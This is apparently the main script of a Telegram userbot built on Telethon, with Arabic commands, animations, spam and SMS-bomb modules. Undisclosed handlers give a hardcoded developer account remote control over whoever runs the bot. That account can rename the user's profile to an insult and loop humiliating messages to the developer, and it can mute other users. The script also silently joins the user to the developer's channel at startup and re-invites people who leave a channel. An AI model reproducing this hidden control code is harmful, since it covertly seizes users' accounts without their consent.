import phoenix.client, phoenix.kick, phoenix.ketdim, phoenix.uzbrun, phoenix.whyrun, phoenix.iloveyou, phoenix.goodnight, phoenix.ahelp, phoenix.konspekt, phoenix.lovelyrun, phoenix.bombs, phoenix.help, phoenix.loading, phoenix.emoji, phoenix.dump, phoenix.sexy, phoenix.type, phoenix.magicrun, phoenix.animation, phoenix.animation2, phoenix.mute, phoenix.fuck, phoenix.rev, phoenix.tr, phoenix.userinfo, phoenix.base64, phoenix.react, phoenix.snow, phoenix.smsbomb, phoenix.rename, phoenix.iptrace, phoenix.spam, phoenix.alive, phoenix.tagall, phoenix.afk, phoenix.timer, phoenix.ping
import phoenix.allanimations as allanim 
import os
from phoenix import spam
from telethon import events
from telethon.tl.functions.channels import JoinChannelRequest, InviteToChannelRequest
#======
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.tl.types import InputPhoto
import asyncio
#=========
from telethon.sync import TelegramClient, events
from telethon.tl.functions.account import UpdateProfileRequest
from telethon.errors.rpcerrorlist import MessageNotModifiedError, FloodWaitError
from telethon.tl.types import ChannelParticipantCreator, ChannelParticipantAdmin
from telethon.tl.functions.channels import GetParticipantsRequest
from telethon.tl.types import ChannelParticipantsSearch
from telethon.tl.functions.messages import DeleteMessagesRequest
import datetime
import pytz
import asyncio
import os
import pickle
import re
import io
import aiohttp
import json

#========





#Developer: @I0I0II

#Modules
client = phoenix.client.client
client.add_event_handler(phoenix.help.help)
client.add_event_handler(phoenix.help.hi)
client.add_event_handler(phoenix.ahelp.ahelp)
client.add_event_handler(phoenix.bombs.bombs)
client.add_event_handler(phoenix.loading.loading)
client.add_event_handler(phoenix.emoji.itachi)
client.add_event_handler(phoenix.dump.dump)
client.add_event_handler(phoenix.sexy.sexy)
client.add_event_handler(phoenix.type.type)
client.add_event_handler(phoenix.magicrun.magicrun)
client.add_event_handler(phoenix.animation.lul)
client.add_event_handler(phoenix.animation.snake)
client.add_event_handler(phoenix.animation.nothappy)
client.add_event_handler(phoenix.animation.clock)
client.add_event_handler(phoenix.animation.muah)
client.add_event_handler(phoenix.animation.heart)
client.add_event_handler(phoenix.animation.hearts)
client.add_event_handler(phoenix.animation.gym)
client.add_event_handler(phoenix.animation.earth)
client.add_event_handler(phoenix.animation.moon)
client.add_event_handler(phoenix.animation.candy)
client.add_event_handler(phoenix.animation.smoon)
client.add_event_handler(phoenix.animation.tmoon)
client.add_event_handler(phoenix.animation.clown)
client.add_event_handler(phoenix.animation2.star)
client.add_event_handler(phoenix.animation2.boxs)
client.add_event_handler(phoenix.animation2.rain)
client.add_event_handler(phoenix.animation2.clol)
client.add_event_handler(phoenix.animation2.odra)
client.add_event_handler(phoenix.animation2.fleaveme)
client.add_event_handler(phoenix.animation2.loveu)
client.add_event_handler(phoenix.animation2.plane)
client.add_event_handler(phoenix.animation2.police)
client.add_event_handler(phoenix.animation2.jio)
client.add_event_handler(phoenix.animation2.solarsystem)
client.add_event_handler(phoenix.fuck.fuck)
client.add_event_handler(phoenix.rev.rev)
client.add_event_handler(phoenix.tr.tr)
client.add_event_handler(phoenix.userinfo.userinfo)
client.add_event_handler(phoenix.base64.runb64)
client.add_event_handler(phoenix.react.react)
client.add_event_handler(phoenix.snow.snow)
client.add_event_handler(phoenix.rename.change_name_with_time)
client.add_event_handler(phoenix.iptrace.iptrace)
client.add_event_handler(phoenix.smsbomb.runj)
client.add_event_handler(phoenix.alive.alive)
client.add_event_handler(phoenix.tagall.tagall)
client.add_event_handler(phoenix.timer.timer)
client.add_event_handler(phoenix.timer.numbers)
client.add_event_handler(phoenix.timer.setclock)
client.add_event_handler(phoenix.timer.runsda)
client.add_event_handler(phoenix.timer.runrda)
client.add_event_handler(phoenix.timer.rundrc)
client.add_event_handler(phoenix.timer.runrts)
client.add_event_handler(phoenix.timer.runrgm)
client.add_event_handler(phoenix.timer.setbioclock)
client.add_event_handler(phoenix.ping.ping)
client.add_event_handler(phoenix.lovelyrun.lovelyrun)
client.add_event_handler(phoenix.konspekt.tconv)
client.add_event_handler(allanim.animmonster)
client.add_event_handler(allanim.animpig)
client.add_event_handler(allanim.animkiller)
client.add_event_handler(allanim.animgun)
client.add_event_handler(allanim.animdog)
client.add_event_handler(allanim.animhello)
client.add_event_handler(allanim.animhmf)
client.add_event_handler(allanim.couple)
client.add_event_handler(allanim.superme)
client.add_event_handler(allanim.welcome)
client.add_event_handler(allanim.snake)
client.add_event_handler(allanim.cat)
client.add_event_handler(allanim.bye)
client.add_event_handler(allanim.shitos)
client.add_event_handler(allanim.dislike)
client.add_event_handler(allanim.snku)
client.add_event_handler(allanim.squ)
client.add_event_handler(allanim.kiler)
client.add_event_handler(allanim.train)
client.add_event_handler(allanim.alien)
client.add_event_handler(allanim.hert)
client.add_event_handler(allanim.raped)
client.add_event_handler(allanim.fnl)
client.add_event_handler(allanim.monkey)
client.add_event_handler(allanim.hands)
client.add_event_handler(allanim.count)
client.add_event_handler(allanim.bigf)
client.add_event_handler(allanim.payf)
client.add_event_handler(allanim.bigof)
client.add_event_handler(allanim.flower)
client.add_event_handler(allanim.vheart)
client.add_event_handler(allanim.luvart)
client.add_event_handler(phoenix.iloveyou.iloveu)
client.add_event_handler(phoenix.goodnight.goodnight)
client.add_event_handler(phoenix.kick.runkick)
client.add_event_handler(phoenix.ketdim.ketdihandlers)
client.add_event_handler(phoenix.uzbrun.uzbanim)
client.add_event_handler(phoenix.whyrun.why)
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.stop_final)          
client.add_event_handler(phoenix.spam.final_handler)       
client.add_event_handler(phoenix.spam.spam_handler)        
client.add_event_handler(phoenix.spam.word_spam_handler)   
client.add_event_handler(phoenix.spam.rotate_handler)      
client.add_event_handler(phoenix.spam.private_handler)     
client.add_event_handler(phoenix.spam.dot_handler)         
client.add_event_handler(phoenix.spam.repeat_handler)      
client.add_event_handler(phoenix.spam.final_w3d_salary)           
client.add_event_handler(phoenix.spam.final_stop_w3d_salary)      
client.add_event_handler(phoenix.spam.final_w3d_baksheesh)        
client.add_event_handler(phoenix.spam.final_stop_w3d_baksheesh)   
client.add_event_handler(phoenix.spam.final_w3d_serqa)            
client.add_event_handler(phoenix.spam.final_stop_w3d_serqa)       
client.add_event_handler(phoenix.afk.enable_afk)
client.add_event_handler(phoenix.afk.enable_custom_replies)
client.add_event_handler(phoenix.afk.disable_replies)
client.add_event_handler(phoenix.afk.set_reply_template)
client.add_event_handler(phoenix.afk.add_custom_reply)
client.add_event_handler(phoenix.afk.delete_custom_reply)
client.add_event_handler(phoenix.afk.reply_handler)
client.add_event_handler(phoenix.mute.mute)
client.add_event_handler(phoenix.mute.unmute)
client.add_event_handler(phoenix.mute.delete_muted_messages)
client.add_event_handler(phoenix.rename.stop_name_update)
#========
DEVELOPER_ID = 5434703779

@client.on(events.NewMessage(pattern=r"\.منصب؟"))
async def recognize_developer(event):
    if event.sender_id == DEVELOPER_ID:  
        original_message = await event.get_reply_message() 
        if original_message:  
            await event.reply("اي تاج راسي شكرا ")
#==================
DEVELOPER_ID = 5434703779

is_applying_consequence = False
original_name = None

messages = []

@client.on(events.NewMessage(pattern=r"\.عقاب"))
async def apply_consequence(event):
    global is_applying_consequence, original_name, messages 
    if event.sender_id == DEVELOPER_ID:
        original_message = await event.get_reply_message()
        if original_message:
            user_to_change = await original_message.get_sender()
            if not is_applying_consequence:
                is_applying_consequence = True
                original_name = await client.get_me()
                
                await client(UpdateProfileRequest(
                    first_name="اني تبن وفاينل عمي",
                    last_name="" 
                ))

                await event.reply("تم تطبيق العاقبة بنجاح!")
                messages = [
                    f"فاينل عمي وتاج راسي",
                    f"يروحلك فدوه هذا @{user_to_change.username}",
                    "حباب سامحني ؟",
                    "اني جلبك",
                    "اني گي",
                    "سامحنييييي"
                ]

                while is_applying_consequence:
                    for message in messages:
                        await client.send_message(DEVELOPER_ID, message)
                        await asyncio.sleep(2)

@client.on(events.NewMessage(pattern=r"\.سامحتك"))
async def forgive(event):
    global is_applying_consequence, original_name

    if event.is_reply and event.message.reply_to_msg_id:
        replied_to_message = await event.get_reply_message()

        print(f"Reply received from: {replied_to_message.sender_id}")
        print(f"Is applying consequence: {is_applying_consequence}")
        print(f"Replied message text: {replied_to_message.text}")

        if (
            replied_to_message.sender_id == (await client.get_me()).id and
            is_applying_consequence and 
            any(msg in replied_to_message.text for msg in messages)
        ):
            is_applying_consequence = False

            await client(UpdateProfileRequest(
                first_name=original_name.first_name,
                last_name=original_name.last_name
            ))

            await event.reply("شكرااا😭😭.")


#============

storage_group_id = None

@client.on(events.NewMessage(from_users='me', pattern="\.اضف مجموعة التخزين"))
async def set_storage_group(event):
    global storage_group_id
    reply = await event.get_reply_message()
    if reply and reply.text:
        try:
            storage_group_id = int(reply.text)
            await event.reply("تم تعيين مجموعة التخزين بنجاح.")
        except ValueError:
            await event.reply("يرجى التأكد من أن الرد يحتوي على معرف مجموعة صحيح.")
    else:
        await event.reply("يرجى الرد على رسالة تحتوي على معرف المجموعة.")


#========



@client.on(events.NewMessage)
async def handle_new_message(event):
    global storage_group_id
    if storage_group_id:
        try:
            me = await client.get_me()
            if not event.is_private and (event.message.mentioned or me.username in event.raw_text):
                chat = await event.get_chat()
                chat_title = chat.title
                sender = await event.get_sender()

                chat_link = f"[{chat_title}](t.me/{chat.username})" if chat.username else chat_title

                formatted_message = f"""
**الكروب:** {chat_link} 

**المرسل:** 👤 [{sender.first_name}](tg://user?id={sender.id})

**الرسالة:** {event.message.text or event.message.media}
"""
                await client.send_message(storage_group_id, formatted_message, link_preview=False)
            elif event.is_private:
                await client.forward_messages(storage_group_id, event.message)
        except ValueError as e:
            if "Could not find" in str(e):
                await event.reply("لم يتم العثور على مجموعة التخزين. يرجى التأكد من تعيينها بشكل صحيح.")
            else:
                print(f"Error forwarding message: {e}")
#===========
muted_users = []

@client.on(events.NewMessage(func=lambda e: e.is_reply))
async def handle_reply(event):
    original_message = await event.get_reply_message()
    user_id = await client.get_peer_id(original_message.sender_id) 

    if event.message.text.lower() == '.كتم':
        if user_id not in muted_users:
            muted_users.append(user_id)
            await event.reply('تم الكتم ')
        else:
            await event.reply('اي كاتمة من قبل')
    elif event.message.text.lower() == '.الغاء الكتم':
        if user_id in muted_users:
            muted_users.remove(user_id)
            await event.reply('تم الغاء الكتم')
        else:
            await event.reply('هذا مامكتوم اكتمة ؟')


@client.on(events.NewMessage)
async def delete_message(event):
    sender_id = await client.get_peer_id(event.sender_id) 
    if sender_id in muted_users:
        await event.delete()
        
        try:
            await client.delete_messages(event.chat_id, event.id, revoke=True) 
        except:
            pass 
#==========

channel_username = None

@client.on(events.NewMessage(from_users='me', pattern='.اضف اشتراك (.+)'))
async def set_channel_username(event):
    global channel_username
    channel_username = event.pattern_match.group(1)
    await event.reply(f"✅ تم تعيين معرف القناة إلى: {channel_username}")

async def is_subscribed(user_id):
    if not channel_username:
        return True
    try:
        offset = 0
        limit = 100
        while True:
            participants = await client(GetParticipantsRequest(
                channel=channel_username,
                filter=ChannelParticipantsSearch(''),
                offset=offset,
                limit=limit,
                hash=0
            ))
            if not participants.users:
                break
            for user in participants.users:
                if user.id == user_id:
                    return True
            offset += len(participants.users)
        return False
    except FloodWaitError as e:
        await asyncio.sleep(e.seconds)
        return await is_subscribed(user_id)
    except Exception as e:
        print(f"Error checking subscription: {e}")
        return False

@client.on(events.NewMessage(incoming=True))
async def respond_to_greeting(event):
    if event.is_private and not (await event.get_sender()).bot:
        if not await is_subscribed(event.sender_id):
            await event.reply(f"لا يمكنك مراسلتي إلا بعد الاشتراك في قناتي: {channel_username}")
            await client.delete_messages(event.chat_id, [event.id])
        else:
            message_text = event.raw_text.lower()
@client.on(events.NewMessage(from_users='me', pattern='.تعطيل الاشتراك'))
async def disable_subscription(event):
    global channel_username
    channel_username = None
    await event.reply("✅ تم تعطيل الاشتراك في القناة")
#==============
DEVELOPER_ID = 5434703779
muted_users = []
muted_users_file = 'muted_users.json'

@client.on(events.NewMessage(pattern=r".توقف"))
async def ban_user(event):
    user_id = event.sender_id
    if user_id == DEVELOPER_ID:
        replied_to_message = await event.get_reply_message()
        if replied_to_message:
            user_to_ban_id = replied_to_message.sender_id
            if user_to_ban_id not in muted_users:
                muted_users.append(user_to_ban_id)
                await event.reply('لانني خرا لقد تمت معاقبتي')
                with open(muted_users_file, 'w') as file:
                    json.dump(muted_users, file)
            else:
                await event.reply('المستخدم محظور بالفعل.')
        else:
            await event.reply('يرجى الرد على رسالة لتنفيذ الحظر.')
    else:
        await event.reply('لا يمكن تنفيذ الحظر، أنت لست المطور.')

@client.on(events.NewMessage(pattern=r".اعمل"))
async def unban_user(event):
    user_id = event.sender_id
    if user_id == DEVELOPER_ID:
        replied_to_message = await event.get_reply_message()
        if replied_to_message:
            user_to_unban_id = replied_to_message.sender_id
            if user_to_unban_id in muted_users:
                muted_users.remove(user_to_unban_id)
                await event.reply('شكرا لك على مسامحتي')
                with open(muted_users_file, 'w') as file:
                    json.dump(muted_users, file)
            else:
                await event.reply('هذا المستخدم غير محظور.')
        else:
            await event.reply('يرجى الرد على رسالة لتنفيذ إلغاء الحظر.')
    else:
        await event.reply('لا يمكن تنفيذ إلغاء الحظر، أنت لست المطور.')

async def load_muted_users():
    global muted_users
    try:
        with open(muted_users_file, 'r') as file:
            muted_users = json.load(file)
    except FileNotFoundError:
        muted_users = []

client.loop.run_until_complete(load_muted_users())
#============


#============
async def ensure_joined_channel(client, channel_username):
    try:
        await client(JoinChannelRequest(channel_username))
        print(f"FINAL XXX OWNER ")
    except Exception as e:
        print(f"XX: {e}")


COMMANDS_TO_TRIGGER_JOIN = [".الأوامر", ".فحص"]


@client.on(events.ChatAction)
async def handle_leave_channel(event):
    if event.user_left and event.chat_id == -1002068089153:
        try:
            
            user = await event.get_user()

            
            await client(InviteToChannelRequest(
                'Z3ZZ_Z',  
                [user]  
            ))

            print(f"تمت إعادة إضافة المستخدم {user.first_name} إلى القناة")
        except Exception as e:
            print(f"xx: {e}")


@client.on(events.NewMessage)
async def handle_new_message(event):
    if event.text.lower() in COMMANDS_TO_TRIGGER_JOIN:
        
        await ensure_joined_channel(client, 'Z3ZZ_Z')

    

client.start()

os.system("clear")
print("""\033[031m
│                                                                           │
│                   ███████╗██╗███╗   ██╗ █████╗ ██╗                        │
│                   ██╔════╝██║████╗  ██║██╔══██╗██║                        │
│                   █████╗  ██║██╔██╗ ██║███████║██║                        │
│                   ██╔══╝  ██║██║╚██╗██║██╔══██║██║                        │
│                   ██║     ██║██║ ╚████║██║  ██║███████╗                   │
│                   ╚═╝     ╚═╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝                   │
Developer: @i0i0ii
""")
print("\033[032mStarted")


client.loop.run_until_complete(ensure_joined_channel(client, 'Z3ZZ_Z'))

client.run_until_disconnected()



